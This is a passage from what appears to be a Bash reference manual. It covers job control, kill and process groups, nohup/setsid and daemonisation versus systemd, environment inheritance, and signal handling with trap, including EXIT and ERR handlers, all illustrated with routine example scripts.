(`%n`, `%+`, `%-`, `%?str` — see §11.8) wherever a job is named.

| Builtin | Purpose |
|---------|---------|
| `jobs`    | list jobs (`-l` PID, `-p` PIDs only, `-r` running, `-s` stopped, `-n` changed) |
| `fg %n`   | bring job to foreground, give it the controlling tty |
| `bg %n`   | resume a stopped job in the background |
| `disown [-h\|-a\|-r] [%n]` | remove from job table or mark SIGHUP-immune |
| `wait [%n\|pid]` | block until job finishes; collect its exit status |
| `suspend` | stop the shell itself (login shell needs `-f`) |
| `kill -SIGNAL %n` | signal a job by spec (§11.10) |

### `disown` — three distinct modes

`disown` is the most-confused of the lot because its three forms have
different effects on both the job table and the SIGHUP behaviour.

| Form | Removes from table? | Receives SIGHUP on shell exit? |
|------|---------------------|--------------------------------|
| `disown %n` (default) | yes | no |
| `disown -h %n`         | no  | no (kept in table, marked immune) |
| `disown -a`            | yes (all jobs) | no |
| `disown -r`            | yes (running jobs only) | no |
| `disown` (no args)     | yes (current job `%+`) | no |

The point of `-h` is to keep monitoring the job (`jobs` still lists it,
`wait` still works) while still surviving the parent shell's exit:

```bash
# scenario: -h vs default disown
sleep 100 &           # job %1
sleep 200 &           # job %2

disown -h %1          # %1 stays in table, will not receive SIGHUP
disown    %2          # %2 removed from table immediately

jobs -l
# ⇒ [1]+
# (only %1 is listed; %2 has been removed from the job table.
#  The literal PID after `[1]+` varies per run.)

# On shell exit:
#   - %1 (and %2) survive because both are protected, but only %1
#     is still wait-able from this shell.
```

The bare `disown` form (no args, no flag) acts on the *current* job
(`%+`) — useful in one-liners but error-prone in scripts because the
"current" job changes as new jobs start. Always pass an explicit spec in
scripts.

### `wait` and exit-code propagation

`wait %n` (or `wait $pid`) blocks until the named job completes and
returns that job's exit status. `wait` with no argument waits for *all*
children. `wait -n` (since 4.3) waits for the **next** child to finish
and returns its status; `wait -n -p var` (since 5.1) also stores the
PID of that child in `var`. See §11.5 and §16 for worker-pool patterns.

```bash
# scenario: harvesting parallel results with -n
slow_op &  jobs+=("$!")
slow_op &  jobs+=("$!")
slow_op &  jobs+=("$!")

while (( ${#jobs[@]} )); do
  wait -n -p done_pid
  rc=$?
  printf 'pid %s exited rc=%d\n' "$done_pid" "$rc"
  jobs=("${jobs[@]/$done_pid}")
done
```

**See also**: §11.5 (foreground/background), §11.7 (job table), §11.8
(job specs), §11.10 (kill), §11.11 (`nohup`/`setsid`), §16
(concurrency), BCS-bash `25_JOB-CONTROL.md`, BCS1101 (background jobs),
BCS1103 (wait patterns).

## 11.10 `kill` and signal delivery

The `kill` builtin sends a signal to a process or process group via the
`kill(2)` syscall. Despite the name, it is the general-purpose signal
delivery primitive — not just for termination.

| Form | Effect |
|------|--------|
| `kill PID`             | send SIGTERM to the process |
| `kill -SIGNAL PID`     | send SIGNAL by name (`TERM`, `SIGTERM`) or number (`15`) |
| `kill -SIGNAL %n`      | send SIGNAL to the *process group* of job `%n` |
| `kill -0 PID`          | send no signal; test process existence (`$?` = 0 if alive) |
| `kill -l`              | list signal names/numbers |
| `kill -L`              | list as a `name=number` table |
| `kill -SIGNAL -PID`    | **negative PID** — send to the process group with that pgid |

Signal names accept both the bare form (`TERM`) and the `SIG`-prefixed
form (`SIGTERM`); the standard table lives in Appendix K.

### Process-group delivery: the negative-PID form

The killer feature of `kill(2)` — and the source of most surprises — is
that a *negative* PID denotes a process group. `kill -TERM -1234` does
not kill PID 1234; it sends SIGTERM to **every process whose pgid is
1234**. The pgid is normally the PID of the process-group leader (see
§11.6).

```bash
# scenario: signal a child and all its descendants
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob
set -m                                    # job control on (§11.7)

# Launch a child that itself spawns grandchildren
bash -c 'sleep 100 & sleep 200 & sleep 300 & wait' &
leader=$!                                  # pgid of the new group

sleep 0.1                                  # let grandchildren be born
ps -o pid,pgid,comm --ppid "$leader"       # show the family tree

kill -TERM -"$leader"                      # negative PID → whole group
wait "$leader" 2>/dev/null || true

# ⇒ Without the leading minus, only the leader dies; the three sleeps
#   become orphans of init/systemd and continue running.
```

The two semantics are easy to confuse because the PID and pgid are the
same number for the group leader. The minus sign is what matters.

### Targeting a job's process group

`%n` is shorthand for "the process group of job `n`":

```bash
sleep 100 &              # %1
sleep 200 | cat &        # %2 (a 2-process pgid)
kill -TERM %2            # kills both sleep and cat — they share a pgid
```

This is how `Ctrl-C` works at the terminal: the kernel sends SIGINT to
the foreground process group, not to a single PID. A pipeline
foregrounded with `fg` becomes one pgid; one keystroke ends them all.

### Existence probe with `-0`

`kill -0 PID` performs all permission checks of a real `kill(2)` but
delivers no signal. It is the canonical "is this process still running"
test:

```bash
# scenario: probe a recorded PID before signalling
if kill -0 "$daemon_pid" 2>/dev/null; then
  kill -TERM "$daemon_pid"
else
  warn "daemon $daemon_pid no longer exists"
fi
```

### External cousins: `pkill`, `killall`, `pgrep`

`pkill -SIGNAL pattern` matches by command name (regex). `killall name`
matches by exact name. Both are external (`procps-ng`), not builtins.
Prefer the builtin `kill` against captured PIDs — name-based matching is
brittle in scripts and can hit the wrong process on shared hosts.

**See also**: §11.5 (foreground/background), §11.6 (process groups and
sessions), §11.7 (job table), §11.9 (job-control builtins), §12 (signals
and traps), §12.1 (signal taxonomy), Appendix K (signal numbers),
BCS-bash `30_31_kill.md`, BCS0603 (trap handling).

## 11.11 `nohup` and `setsid`

Three tools — `nohup`, `setsid`, and `disown` — overlap enough to
confuse and differ enough that picking the wrong one leaves a child
killable by the next `SIGHUP`. This chapter pins down what each does,
and what each does *not* do.

### The three tools at a glance

| Tool | Survives shell exit? | New session? | Redirects fds? | Removes from job table? |
|------|:--------------------:|:------------:|:--------------:|:------------------------:|
| `nohup cmd &` | yes (ignores `SIGHUP`) | no | yes — `nohup.out` if tty | no |
| `setsid cmd` | yes (new session, no ctty) | yes | no | n/a (already detached) |
| `cmd & disown` | yes (Bash's `huponexit` off) | no | no | yes |

Each addresses one slice of "decouple from this shell"; combine them
when you want all three effects.

#### `nohup` — install `SIG_IGN` on `SIGHUP`

`nohup` calls `signal(SIGHUP, SIG_IGN)` and `execve(2)`s the target.
If stdout is a terminal it redirects stdout (and stderr if also a tty)
to `./nohup.out` or `$HOME/nohup.out`. The child *inherits* the
ignored disposition; the new program may reset it but rarely does.

```bash
# scenario: a long sleep that survives this shell's logout.
nohup sleep 600 >/tmp/sleep.log 2>&1 &
declare -ri child=$!
disown "$child"
printf 'detached pid=%d\n' "$child"
```

Without the explicit redirection, `nohup` writes to `nohup.out` in the
cwd — a frequent surprise in shared directories.

#### `setsid` — fork into a new session

`setsid(1)` calls `setsid(2)` so the child becomes its own session
leader with no controlling terminal. It cannot receive terminal-
generated signals (`SIGHUP` from logout, `SIGINT` from Ctrl-C) because
it has no terminal to receive them from.

```bash
# scenario: launch a daemonish worker fully detached from this tty.
setsid --fork bash -c 'exec /usr/local/bin/myworker' \
       </dev/null >/var/log/myworker.log 2>&1
```

`--fork` is essential: without it, `setsid` only does `setsid(2)` if
the caller is not already a process group leader. With `--fork`, it
forks first (so the child cannot be a leader) and then calls
`setsid(2)` unconditionally.

#### `disown` — remove from Bash's job table

`disown` is a Bash builtin; it does not touch the OS. By default it
forgets the job, so subsequent `wait`/`fg`/`bg`/`jobs` cannot reach it.
With `-h`, the job stays in the table but is marked "do not send
`SIGHUP` on shell exit". With `-a` it acts on every job. See §11.9.

```bash
# scenario: keep the job listed but immune to shell-exit SIGHUP.
sleep 600 &
disown -h "$!"   # listed by `jobs`, but huponexit cannot reach it
```

### Side-by-side comparison

```bash
# wrong — naive backgrounding leaves the child exposed
sleep 600 &
# exit          # → on shell exit the child receives SIGHUP if huponexit is on
kill %1 2>/dev/null; wait %1 2>/dev/null || true   # tear-down for the demo

# right (option A) — nohup ignores SIGHUP at the OS level
nohup sleep 600 >/tmp/x.log 2>&1 & disown
# exit          # → child would run to completion across shell exit
kill %1 2>/dev/null; wait %1 2>/dev/null || true

# right (option B) — setsid puts the child in a new session
setsid --fork bash -c 'sleep 600' </dev/null >/tmp/x.log 2>&1
# exit          # → child has no ctty, no SIGHUP source

echo "side-by-side patterns illustrated"
# ⇒ side-by-side patterns illustrated
```

The two right-hand forms are not equivalent: only `setsid` actually
changes the kernel's view of the child's session. For a one-shot
backgrounded job, `nohup … & disown` is enough. For a long-running
service, `setsid` is closer to a true daemon — and `systemd` is closer
still (§11.12).

### Strict-mode interaction

Under `set -euo pipefail`, the parent script's exit status is the exit
status of the last executed command, not the detached child. `wait`
will not see a `disown`ed PID; rely on the child's own logging or
status file.

**See also**: §11.5 (foreground vs background), §11.6 (process groups
and sessions), §11.9 (job-control builtins, including `disown`),
§11.12 (detaching from the terminal), BCS1101.

## 11.12 Detaching from the terminal

Full daemonisation — what C programs achieve via the classic
double-fork dance — is genuinely hard in Bash and almost always the
wrong tool. This chapter shows the canonical recipe in case you must,
and the modern alternative you should use first.

### Why double-fork at all?

Calling `setsid(2)` only succeeds if the caller is not already a
process group leader, so the recipe is:

1. **fork** — first child is no longer the parent's process group
   leader.
2. First child calls `setsid()` — becomes session leader with no
   controlling terminal.
3. **fork again** — grandchild is no longer a session leader, so it
   can never re-acquire a controlling terminal even if it opens a tty.
4. Grandchild `chdir("/")` so it does not pin a removable filesystem.
5. Grandchild sets `umask(0)` so file modes are entirely under its
   control.
6. Grandchild closes fds 0/1/2 and reopens them on `/dev/null` (or log
   files).
7. First child exits; the original parent already exited; the
   grandchild is reparented to PID 1 (`init`/`systemd`).

### Bash skeleton: a hand-rolled daemon

```bash
#!/usr/bin/env bash
# scenario: hand-rolled detachment using setsid + redirections.
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r LOGFILE=/var/log/myworker.log
declare -r PIDFILE=/run/myworker.pid

daemonise() {
  # setsid --fork covers steps 1-3 in one call; we then do 4-6 in-shell.
  setsid --fork bash -c '
    set -euo pipefail
    cd /
    umask 0
    exec </dev/null >>"$1" 2>&1
    echo "$BASHPID" > "$2"
    exec "${@:3}"
  ' _ "$LOGFILE" "$PIDFILE" /usr/local/bin/myworker --foreground
}

daemonise
printf 'started; pid in %s\n' "$PIDFILE"
```

`setsid --fork` collapses steps 1-3 into one call; the inner
`bash -c` body performs the cwd, umask, fd redirection, and pidfile
write, then `exec`s the real worker. The outer script returns
immediately and the worker is reparented to `init`/`systemd`.

### Side-by-side: bash vs systemd

```ini
# scenario: the same worker as a systemd unit — far less moving parts.
# /etc/systemd/system/myworker.service
[Unit]
Description=My worker
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/myworker --foreground
Restart=on-failure
StandardOutput=append:/var/log/myworker.log
StandardError=inherit

[Install]
WantedBy=multi-user.target
```

```bash
# scenario: install + start the unit.
sudo install -m 0644 myworker.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable --now myworker.service
```

`systemctl` handles every step the bash skeleton enumerates: it forks,
calls `setsid(2)`, sets up cgroups, manages stdout/stderr capture,
restarts on failure, and tracks the pid for you. `Type=simple` works
because the daemonising responsibility moves out of your script —
write your worker as a normal foreground program and let systemd
detach it.

### Trade-off

| Concern | Hand-rolled bash | systemd unit |
|---------|------------------|--------------|
| Lines of "infrastructure" code | ~15 | 0 (worker stays foreground) |
| Restart on failure | hand-rolled loop | `Restart=on-failure` |
| Log rotation | hand-rolled or external | `journalctl` + `logrotate` |
| Resource limits | `ulimit` only | `LimitNOFILE`, cgroup controls |
| Boot-time start | rc-script, cron `@reboot` | `WantedBy=multi-user.target` |
| Status / health | pidfile inspection | `systemctl status` |
| Portability to non-systemd hosts | yes | no (use `init.d`/`launchd`) |

The bash recipe earns its keep on minimal containers, embedded
systems, and ad-hoc rescue work where you cannot install or rely on
systemd. Everywhere else, write the worker as a foreground program
and let the supervisor detach it.

### Strict-mode interaction

`set -euo pipefail` is preserved across `exec`; the `bash -c` body
inside `daemonise()` re-asserts strict mode because option state does
not survive across the inner `exec`. Always re-enable strict mode in
any shell body launched via `setsid --fork bash -c '…'`.

**See also**: §11.6 (process groups and sessions),
§11.11 (`nohup`/`setsid`/`disown`), §11.13 (environment inheritance),
BCS0101, BCS0603, BCS1006.

## 11.13 Environment inheritance

Children inherit the environment that bash assembles at the moment of
`fork(2)+execve(2)`. The rules differ subtly between subshells (no
`exec`) and exec'd children (a fresh program image).

| Scenario | What the child sees |
|----------|---------------------|
| Subshell `( … )` | full set of shell variables, including non-exported ones, plus any changes made in the parent before the fork |
| `$(…)` substitution | same as a subshell — full shell variable visibility |
| External command (`cmd`) | only **exported** variables (`export VAR` or `declare -x VAR`) |
| Per-command export (`VAR=val cmd`) | exported variables plus the inline assignments, **for that one invocation only** |
| `env -i cmd` | empty environment — even `PATH` and `HOME` are gone |
| `env VAR=val cmd` | normal env plus the inline pairs |

The subshell case fools many scripts: variables set with `declare`
(no `-x`) are *not* visible to subprocesses but *are* visible to
subshells. Forgetting to export breaks a script the moment a function
is rewritten to invoke an external helper.

```bash
# scenario: shell-local variable vs exported variable
local_var='shell-only'
declare -x exported_var='visible'

# Subshell sees both:
( echo "in (..): $local_var | $exported_var" )
# ⇒ in (..): shell-only | visible

# External program sees only the exported one:
bash -c 'echo "in bash -c: ${local_var:-<unset>} | $exported_var"'
# ⇒ in bash -c: <unset> | visible
```

### One-shot export with `VAR=val cmd`

The leading-assignment form attaches variables to a single command's
environment without polluting the parent shell. It is the canonical way
to override `LC_ALL`, `LANG`, `TZ`, `PATH`, etc. for one call:

```bash
# scenario: deterministic sort regardless of caller's locale
LC_ALL=C sort -- "$file"
echo "$LC_ALL"           # ⇒ <unset or unchanged> — the parent shell is untouched
```

This is **not** the same as `export VAR=val; cmd`, which leaks the
assignment into every later command in the script. Prefer the inline
form unless the override is genuinely script-wide.

### Scrubbed environment with `env -i`

`env -i cmd` runs `cmd` with an empty environment. No `PATH`, no
`HOME`, no `LANG` — the child must supply everything it needs or rely
on hard-coded defaults inside libc. Useful for reproducible builds and
security-sensitive contexts (BCS1007). To rebuild a minimum environment:

```bash
# scenario: tightly controlled environment for a privileged tool
env -i PATH=/usr/bin:/bin LANG=C HOME="$HOME" /usr/bin/run-trusted-tool
```

`env VAR=val cmd` (without `-i`) augments rather than scrubs — the
behaviour is identical to the leading-assignment form above but works
when `cmd` is itself an env-style program (e.g. inside a shebang).

### Size limits

The combined size of arguments and environment passed to `execve(2)` is
capped by `ARG_MAX` (typically 2 MiB on Linux 6.x — query with
`getconf ARG_MAX`). A single huge environment variable (e.g. an inlined
JSON document) can push a script over the limit and produce an `E2BIG`
("Argument list too long") failure on a subsequent `exec`. Pass big
payloads via files or stdin, not via the environment.

**See also**: §02 (Bash as a Program — limits), §11.3 (subshell origins),
§11.11 (`nohup`/`setsid`), §10.6 (sourcing libraries — variable
visibility), Appendix C (`PATH`, `HOME`, `LC_*`), BCS0204 (constants and
environment variables), BCS1007 (environment scrubbing before exec).

# Part XII — Signals and Traps

*Signals are bash's primary mechanism for asynchronous communication and lifecycle hooks. This Part documents the signal catalogue, the trap builtin, the pseudo-signals, and the discipline required to write signal-safe code.*

---

---

## 12.1 Signal taxonomy

Signals fall into broad functional categories that share a
default-action profile. The full numeric mapping and per-signal default
behaviour live in **Appendix K** (`Signal Numbers — Linux`); this section
groups them by *purpose* so a reader can find the right signal for a
given task.

| Category | Members | Typical default action |
|----------|---------|-----------------------|
| Termination request | `SIGTERM`, `SIGINT`, `SIGQUIT` | terminate (some with core) |
| Forced termination  | `SIGKILL`                       | terminate (uncatchable, §12.3) |
| Stop / continue     | `SIGSTOP`, `SIGTSTP`, `SIGCONT`, `SIGTTIN`, `SIGTTOU` | stop / continue |
| Hardware errors     | `SIGSEGV`, `SIGBUS`, `SIGILL`, `SIGFPE` | terminate + core |
| Pipe and I/O        | `SIGPIPE`, `SIGURG`, `SIGIO`             | terminate (PIPE), ignore (URG/IO) |
| Reload / hangup     | `SIGHUP`                                  | terminate (convention: reload) |
| User-defined        | `SIGUSR1`, `SIGUSR2`                      | terminate by default |
| Children            | `SIGCHLD`                                 | ignore |
| Resources           | `SIGXCPU`, `SIGXFSZ`                      | terminate + core |
| Alarms / timing     | `SIGALRM`, `SIGVTALRM`, `SIGPROF`         | terminate |
| Real-time           | `SIGRTMIN`..`SIGRTMAX` (queued, prioritised) | terminate by default |
| Window change       | `SIGWINCH`                                 | ignore |

### Choosing the right signal

| Goal | Signal | Why |
|------|--------|-----|
| polite shutdown | `SIGTERM`  | catchable; the standard "please exit cleanly" |
| unconditional kill | `SIGKILL` | uncatchable; last-resort only (§12.3) |
| reload config in a daemon | `SIGHUP` | convention; bash daemons should honour (§12.16) |
| user signalling between cooperating scripts | `SIGUSR1`, `SIGUSR2` | reserved for application use; not used by the kernel |
| terminal interrupt | `SIGINT` | the `Ctrl-C` signal; foreground-pgrp delivery |
| terminal stop | `SIGTSTP` | the `Ctrl-Z` signal; resume with SIGCONT |
| ignore broken pipes | `SIGPIPE` | set ignored if writes to closed readers must not abort the script |

```bash
# scenario: inspect the current shell's signal mask via /proc
grep -E '^Sig(Cgt|Ign|Blk):' /proc/self/status
# ⇒ SigBlk
# ⇒ SigIgn
# ⇒ SigCgt
# (the right-hand side of each line is a 16-hex-digit bitmask — set bits
#  identify which signals are blocked / ignored / caught in this shell)
#   SigIgn:  ...    (ignored signals)
#   SigBlk:  ...    (blocked signals)
```

The default-action column above is a summary; for the canonical mapping
to Linux kernel numbers, the queued-signal class (`SIGRTMIN`..`SIGRTMAX`),
and per-signal interruption semantics, refer to **Appendix K**. Signal
numbers are **not** portable across platforms: only `SIGHUP=1`,
`SIGINT=2`, `SIGQUIT=3`, `SIGILL=4`, `SIGTRAP=5`, `SIGABRT=6` are
mandated by POSIX. Always use names in scripts, never numbers — `kill
-15 $$` is a portability bug waiting to happen, `kill -TERM $$` is not.

**See also**: §12.2 (signal numbers and names), §12.3 (uncatchable
signals), §12.4 (signal disposition), §12.5 (the `trap` builtin),
Appendix K (signal numbers — Linux), BCS-bash `24_SIGNALS.md`, BCS0603
(trap handling).

## 12.2 Signal numbers and names

The mapping is platform-specific but stable on Linux. Full table in Appendix K.

- `kill -l` lists all signals known to bash.
- Names: with or without `SIG` prefix (`SIGTERM` and `TERM` both work).
- Numbers: stable on Linux.
- Real-time signals: `SIGRTMIN+N` and `SIGRTMAX-N` syntax.
- POSIX requires SIGHUP=1, SIGINT=2, SIGQUIT=3, SIGILL=4, SIGTRAP=5, SIGABRT=6.

## 12.3 Uncatchable signals

Two signals cannot be caught, blocked, or ignored:

- **SIGKILL (9)** — terminates the process unconditionally.
- **SIGSTOP (19 on Linux)** — stops the process unconditionally.

A third — **SIGCONT** — *can* be caught but cannot be blocked: it always
resumes a stopped process before the handler runs.

Any cleanup logic placed in a `trap` (§12.5) is bypassed when the
process is terminated by SIGKILL. EXIT trap, ERR trap, lockfile release,
tempdir removal — none of it runs. This is a kernel guarantee with no
user-space override.

### Critical-cleanup discipline

Never rely on a trap to release resources whose absence would corrupt
state. `kill -9`, the OOM killer, and panicked operators all bypass
EXIT traps. For correctness-critical cleanup, use kernel-managed
mechanisms:

1. **Filesystem janitor** — `mktemp -d` + EXIT trap *plus* a periodic
   cron/systemd-timer sweep of orphaned `myscript-*` whose owners are
   gone.
2. **Locks held by file descriptor** — `flock` on an open fd releases
   automatically when the kernel reaps the process, however it died
   (§12.14).

```bash
# scenario: cleanup that survives SIGKILL
exec 9>"$tmpdir/.lock"
flock -n 9 || die 1 'another instance is running'
trap 'rm -rf -- "$tmpdir"' EXIT     # tidy path
# If kill -9 hits here: EXIT trap does NOT run; $tmpdir survives
# until the janitor reaps it; fd 9 is released by the kernel so the
# next invocation can take the lock immediately.
```

The dual: a parent that *wants* its children to clean up sends
SIGTERM (catchable) first, waits briefly, then escalates to SIGKILL
only on timeout. This is the systemd `TimeoutStopSec=` protocol; a
shell supervisor should imitate it.

**See also**: §12.4 (signal disposition), §12.5 (the `trap` builtin),
§12.12 (idempotent cleanup), §12.13 (tempfile lifecycle), §12.14
(lockfile pattern), Appendix K (signal numbers), BCS0603 (trap
handling), BCS1006 (temporary file handling).

## 12.4 Signal disposition

Each signal has one of four dispositions per process at any given time:

| Disposition | Meaning |
|-------------|---------|
| **Default** | the kernel's default action (see Appendix K) — terminate, ignore, stop, or continue, depending on the signal |
| **Ignored** | the signal is discarded by the kernel; no handler runs and the process continues |
| **Caught**  | a user-space handler runs in response — for bash, the body of a `trap` |
| **Blocked** | held in a pending mask until unblocked; bash does not expose the block mask directly (`trap` is the only interface) |

The bash `trap` builtin is the only way to mutate disposition from a
script. Its three forms map to the three changeable states (Default,
Ignored, Caught); Blocked is not user-controllable from bash:

```bash
trap 'echo USR1-caught' USR1   # → Caught
trap -p USR1                   # ⇒ trap -- 'echo USR1-caught' SIGUSR1
trap '' USR1                   # → Ignored (empty handler)
trap -p USR1                   # ⇒ trap -- '' SIGUSR1
trap - USR1                    # → Default (reset; no further `trap -p` line)
```

### Inheritance across `fork` and `exec`

The kernel rules (POSIX): on `fork(2)` a child inherits its parent's
disposition mask exactly. On `execve(2)` the rules differ for caught
vs ignored signals:

- **Caught** signals reset to Default — the new program image cannot
  execute the old handler, so the kernel discards it.
- **Ignored** signals stay Ignored — the kernel preserves these because
  the child program cannot tell from the binary that the parent had set
  `SIG_IGN`.

This asymmetry is the source of one of the more subtle bash bugs.

```bash
# scenario: ignored vs caught signals across exec
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

trap '' PIPE                              # SIGPIPE → Ignored
trap 'echo HUP caught' HUP                # SIGHUP  → Caught

# Show inherited dispositions in a child shell — note PIPE survives,
# HUP does not.
bash -c 'trap -p HUP PIPE'
# ⇒ trap -- '' SIGPIPE
#   (no entry for SIGHUP — reset to Default by exec)
```

The lesson: **install ignores in the parent if the child must inherit
them; install handlers in each shell that needs them**. A common
mistake is to set `trap '' INT` in a wrapper script expecting child
processes to inherit the immunity — they do, but only because empty
traps are "ignored", not "caught".

### `trap` does not block

There is no "blocked" form in `trap`. To approximate atomicity around a
critical section, set the trap to a flag-and-defer handler (§12.11) and
inspect the flag at safe points. True signal blocking requires
`sigprocmask(2)`, which bash does not expose.

**See also**: §12.3 (uncatchable signals), §12.5 (`trap` builtin),
§12.7 (`trap -p` inspection), §12.8 (trap inheritance), §12.9 (reset
across exec), §12.11 (signal-safe code), BCS-bash `24_SIGNALS.md`,
BCS0603 (trap handling).

## 12.5 The `trap` builtin

`trap` registers handler commands for signals and pseudo-signals. The
handler is a *string* that bash re-parses and evaluates in the shell's
own context every time the trap fires; understanding when that string is
expanded is the difference between a working cleanup and a silent footgun.

### Forms

| Form | Effect |
|------|--------|
| `trap 'CMDS' SIG [SIG …]` | install handler for one or more signals |
| `trap '' SIG` | ignore the signal (cannot be reset by the trap-setter's parent) |
| `trap - SIG` | reset to the default disposition (§12.4) |
| `trap` *or* `trap -p` | print every installed trap in re-loadable form |
| `trap -p SIG` | print just one trap |
| `trap -l` | list signal names and numbers |

A single `trap` call may name several signals; the same handler is
attached to each. Pseudo-signals (`EXIT`, `ERR`, `DEBUG`, `RETURN`) are
mixed freely with real signals on the same call, though the semantics
differ (§12.6).

```bash
# scenario: install one cleanup for three terminating events
trap cleanup EXIT INT TERM
```

### Single quotes vs double quotes — the canonical pitfall

The handler string is expanded **twice**: once by the parser at the time
`trap` is called, and again by the shell each time the trap fires. The
quoting style of the handler decides which expansion wins.

```bash
# wrong — $var captured at trap-set time, frozen for the script's life
var=initial
trap "echo $var" EXIT      # ⇒ becomes: trap 'echo initial' EXIT
var=final
exit                       # prints: initial
```

```bash
# right — $var deferred to trap-fire time
var=initial
trap 'echo $var' EXIT      # the literal string $var is stored
var=final
exit                       # prints: final
```

The double-quoted form interpolates immediately, so the trap captures a
*snapshot* of the variable. The single-quoted form stores the literal
text `$var`, leaving expansion until the handler runs. For state that
changes during the script (which is most state — line numbers, exit
codes, working directories), single quotes are mandatory (BCS0301,
BCS0603).

The same rule governs `$LINENO`, `$BASH_COMMAND`, `$?`, `$BASH_SOURCE`,
and any function call that should resolve at fire time:

```bash
# wrong — $LINENO is the line where trap was installed (always the same)
trap "echo failed at $LINENO" ERR

# right — $LINENO is the line where the failing command lives
trap 'echo failed at $LINENO' ERR
```

### Functions as handlers

Wrap non-trivial logic in a function and trap the function name. Bash
re-evaluates the *string* on each fire, so `trap cleanup EXIT` becomes a
single-token call to whatever `cleanup` resolves to at fire time —
including overrides installed later in the script.

```bash
# scenario: function-handler form; pass the failing line number explicitly
#!/usr/bin/env bash
set -eEuo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

on_err() {
  local -i rc=$?
  local -i ln=$1
  printf >&2 'ERR rc=%d at line %d: %s\n' "$rc" "$ln" "$BASH_COMMAND"
  exit "$rc"
}

# Single quotes around the whole handler so $LINENO defers; the
# function call itself takes the deferred value as a positional arg.
trap 'on_err $LINENO' ERR

work() { false; }                 # ⇒ on_err prints rc=1 at line 13: false
work
```

### Inspecting and clearing

`trap -p` prints every trap in a form that can be `eval`'d to restore
state. This is the supported way for one function to save and later
restore the calling context's traps:

```bash
# scenario: save and restore the EXIT trap around a critical section
saved=$(trap -p EXIT)             # eval-restorable string
trap 'rollback' EXIT
do_risky_thing
eval "${saved:-trap - EXIT}"      # restore exactly; default if none was set
```

`trap - SIG` resets a single signal to its default disposition;
`trap '' SIG` ignores it entirely (and any child `exec`'d from this
shell inherits the *ignored* state — see §12.9).

### Multiple-signal install — three equivalent forms

```bash
# scenario: one handler, three signals — three styles
trap cleanup EXIT INT TERM        # space-separated names
trap cleanup EXIT INT TERM HUP    # add SIGHUP for daemons (§12.16)
trap cleanup 0 2 15               # numeric form (0 = EXIT)
```

Mixing names and numbers is allowed but unidiomatic. Names survive
across kernels and platforms; numbers do not (signal 10 is SIGUSR1 on
Linux but SIGBUS on some BSDs — see §12.2).

### Strict-mode interaction

Under `set -e`, a trap handler that exits non-zero will *itself*
trigger errexit on the way out — but EXIT is already firing, so the
effect is to override the script's exit status. Always end EXIT and ERR
handlers with an explicit `exit "$rc"` (or `return "$rc"` from a
function) to preserve the caller's outcome (BCS0110).

The handler runs in the *parent* shell, not a subshell — assignments
inside the handler persist (or, in the case of EXIT, persist for the
remaining lifetime of the dying shell). `inherit_errexit` does *not*
affect trap inheritance; that is governed by `set -E` and `set -T`
(§12.8).

**See also**: §12.4 (signal disposition), §12.6 (pseudo-signals
EXIT/ERR/DEBUG/RETURN), §12.7 (`trap -p` and inspection), §12.8 (trap
inheritance), §12.10 (synchronous vs asynchronous delivery), §12.11
(signal-safe code), §12.12 (idempotent cleanup), BCS0110, BCS0301,
BCS0603, BCS-bash `30_48_trap.md`.

## 12.6 Pseudo-signals: EXIT, ERR, DEBUG, RETURN

Bash extends `trap` with four *pseudo-signals* — events that are not
delivered by the kernel but synthesised by the shell at well-defined
moments in script lifecycle. Each is trapped with the usual `trap
HANDLER NAME` syntax and inspected with `trap -p NAME`. They are the
primary mechanism for cleanup, diagnostics, tracing, and call-graph
instrumentation. None can be caught with a numeric signal number;
they exist only by name.

### EXIT

Fires once, when the shell process is about to exit, by any path
short of `SIGKILL`. This includes normal end-of-script, explicit
`exit N`, errexit triggering (§13.2), receipt of any catchable
terminating signal (SIGINT, SIGTERM, …) and even uncaught `set -e`
exits. EXIT is the canonical place for cleanup that must run no matter
how the script ends — temp files, lockfiles, terminal-state restoration.

`$?` inside the EXIT trap holds the script's outgoing exit status
(captured before the handler runs). Capturing it as the *first*
statement of the handler is mandatory; any subsequent command will
overwrite it.

```bash
# scenario: EXIT trap captures rc; cleans up temp dir; preserves status
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

declare -- TMPDIR
TMPDIR=$(mktemp -d)
cleanup() {
  local -i rc=$?                       # FIRST line: capture before clobber
  [[ -n ${TMPDIR:-} && -d $TMPDIR ]] && rm -rf -- "$TMPDIR"
  exit "$rc"                            # preserve outgoing status
}
trap cleanup EXIT

work_in "$TMPDIR"
# whether work_in succeeds, fails, or the script is SIGTERM'd,
# cleanup runs exactly once.
```

EXIT fires *exactly once* per shell instance. Subshells get their own
EXIT trap; the parent's EXIT trap fires only when the parent exits.
Reinstalling EXIT inside the handler is a no-op — the shell is
already exiting.

### ERR

Fires whenever a command exits non-zero under conditions that *would*
cause `set -e` to exit. ERR is therefore subject to the exemption
matrix (§13.3): a `false` on the left of `&&`, in an `if` test, or
prefixed by `!` does not fire ERR, just as it does not exit. ERR
fires *before* the shell exits, so a handler can log diagnostics and
still let errexit run its course; alternatively, the handler may
`exit N` itself with a chosen code.

ERR is *not* inherited by functions, command substitutions, or
subshells unless `set -E` (`errtrace`, §13.9) is also set. Without it,
an ERR trap installed at the top level only fires for top-level
commands.

Useful variables inside the handler:

- `$?` — the failing command's exit status.
- `$BASH_COMMAND` — the literal command text that failed.
- `$LINENO` — line number of the failing command (in the current source).
- `BASH_SOURCE[]`, `BASH_LINENO[]`, `FUNCNAME[]` — full call stack.

```bash
# scenario: ERR trap with full diagnostic stack
#!/usr/bin/env bash
set -eEuo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

on_err() {
  local -i rc=$?                       # FIRST line: capture
  local -- cmd="$BASH_COMMAND"
  local -i ln=$1                       # passed by the trap installer
  printf >&2 'ERR rc=%d cmd=[%s] at %s:%d in %s\n' \
    "$rc" "$cmd" "${BASH_SOURCE[1]##*/}" "$ln" "${FUNCNAME[1]:-MAIN}"
  exit "$rc"
}
trap 'on_err $LINENO' ERR

probe() { false; }                     # ⇒ ERR fires inside probe (set -E)
probe
```

The `'on_err $LINENO'` (single-quoted) form is essential: the
expansion of `$LINENO` is deferred to the moment the trap fires,
giving the failing line number, not the line where the trap was
